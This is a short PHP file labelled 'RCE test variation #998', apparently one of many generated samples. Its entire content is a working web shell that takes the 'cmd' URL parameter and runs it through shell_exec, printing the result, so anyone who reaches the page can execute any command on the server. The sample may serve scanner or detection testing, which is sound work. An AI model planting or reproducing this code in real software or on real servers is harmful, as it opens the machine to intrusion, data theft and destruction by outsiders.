<?php
// RCE test variation #998
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>